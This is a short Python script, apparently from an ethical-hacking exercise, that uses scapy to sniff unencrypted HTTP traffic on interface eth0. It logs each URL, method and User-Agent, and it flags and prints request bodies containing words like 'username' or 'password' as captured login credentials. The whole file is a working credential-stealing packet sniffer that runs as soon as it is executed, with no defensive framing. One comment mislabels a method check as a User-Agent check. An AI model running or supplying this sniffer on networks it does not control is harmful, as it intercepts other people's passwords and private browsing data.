import scapy.all as scapy
from scapy.layers import http

# Start sniffing on the specified interface with HTTP filtering
def sniff(interface):
    # Sniff only HTTP traffic (port 80) to minimize packet processing overhead
    scapy.sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80")

# Extract full URL from the HTTP request
def get_url(packet):
    try:
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        return f"http://{host}{path}"
    except AttributeError:
        return None

# Extract potential login information from the packet
def get_login_information(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors='ignore')
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load.lower():  # Case-insensitive search for keywords
                return load
    return None

# Process the packet and extract relevant information
def process_packet(packet):
    # Check if the packet contains an HTTP request
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if url:
            print(f"[+] HTTP Request >> {url}")
        
        # Check if the request has a User-Agent header
        if packet[http.HTTPRequest].Method:
            print(f"[*] Method: {packet[http.HTTPRequest].Method.decode()}")
        
        if packet.haslayer(http.HTTPRequest) and packet[http.HTTPRequest].User_Agent:
            print(f"[*] User-Agent: {packet[http.HTTPRequest].User_Agent.decode()}")

        # Extract potential login information
        login_info = get_login_information(packet)
        if login_info:
            print(f"\n[+] Possible login credentials >> {login_info}\n")

# Start sniffing on the interface 'eth0'
sniff("eth0")
